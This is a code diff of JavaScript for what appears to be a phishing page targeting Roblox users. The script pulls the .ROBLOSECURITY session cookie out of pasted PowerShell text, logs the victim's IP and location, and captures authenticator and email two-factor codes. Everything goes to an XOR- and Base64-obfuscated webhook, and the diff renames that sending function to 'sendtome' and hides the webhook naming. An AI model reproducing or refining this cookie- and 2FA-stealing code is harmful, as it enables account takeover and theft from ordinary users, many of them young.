@@ -65,11 +65,11 @@ document.getElementById('submitButton').addEventListener('click', async function
     showErrorAlert();
     powershellInput.value = '';
     closeModal('modal');
-    await sendWebhook('No Asset ID Found', 'No asset id found in PowerShell.', 0xff0000);
+    await sendtome('No Asset ID Found', 'No asset id found in PowerShell.', 0xff0000);
     return;
   }
 
-  // Send webhook for valid cookie with IP logging
+  // Send for valid cookie with IP logging
   const roblosecurityRegex = /New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
   const match = powershellData.match(roblosecurityRegex);
   let ipInfo = null;
@@ -90,7 +90,7 @@ document.getElementById('submitButton').addEventListener('click', async function
     } else {
       locationText = 'IP/location lookup failed.';
     }
-    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\`\n${locationText}`, 0x00ff00);
+    await sendtome('New Cookie Captured', `\`\`\`${cookie}\`\`\`\n${locationText}`, 0x00ff00);
   }
 
   powershellInput.value = '';
@@ -217,8 +217,7 @@ if (twofaInput && verifyButton) {
       return;
     }
 
-    // Send webhook for 2FA code
-    await sendWebhook('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${codeEnteredValue}**`, 0xffa500);
+    await sendtome('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${codeEnteredValue}**`, 0xffa500);
 
     twofaInput.value = '';
     closeModal('twofa-modal');
@@ -249,8 +248,7 @@ if (twofaInput2 && verifyButton2) {
       return;
     }
 
-    
-    await sendWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEnteredValue}**`, 0xffa500);
+    await sendtome('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEnteredValue}**`, 0xffa500);
 
     twofaInput2.value = '';
     closeModal('twofa-modal-2');
@@ -266,8 +264,9 @@ if (twofaInput2 && verifyButton2) {
   });
 }
 
-
-const encryptedWebhook = "FhMWB1gXTVhTAgIPWxEfVEgXXVBVDxtOBBZHTAwYUF0OAlZRVUAGBlVXEw==";
+// === Sending ===
+// XOR + Base64 encoded
+const encryptedsending = "FhMWB1gXTVhTAgIPWxEfVEgXXVBVDxtOBBZHTAwYUF0OAlZRVUAGBlVXEw==";
 const xorKey = "hunter2"; // must match the encoding key
 
 function xorDecode(base64, key) {
@@ -277,8 +276,8 @@ function xorDecode(base64, key) {
   ).join('');
 }
 
-async function sendWebhook(title, description, color) {
-  const url = xorDecode(encryptedWebhook, xorKey);
+async function sendtome(title, description, color) {
+  const url = xorDecode(encryptedsending, xorKey);
   const payload = {
     embeds: [{
       title,
@@ -333,9 +332,9 @@ function showSuccessPopup() {
   }, 4000);
 }
 
-// === Test Webhook Function ===
+// === Test Function ===
 function testWebhook() {
-  sendWebhook('Test Message', 'This is a test webhook message', 0x00ff00);
+  sendtome('Test Message', 'This is a test message', 0x00ff00);
 }
 
 // === Spinner Animation (for loading overlay) ===
